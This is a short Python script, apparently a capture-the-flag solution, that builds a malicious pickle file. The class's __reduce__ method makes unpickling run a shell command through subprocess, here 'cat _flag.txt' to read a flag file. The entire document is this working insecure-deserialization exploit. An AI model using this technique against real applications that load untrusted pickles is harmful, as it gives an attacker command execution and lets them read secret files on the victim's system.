import pickle
import subprocess

class ReadFlag1:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "_flag.txt"],))

with open("read_flag1.pkl", "wb") as f:
    pickle.dump(ReadFlag1(), f)
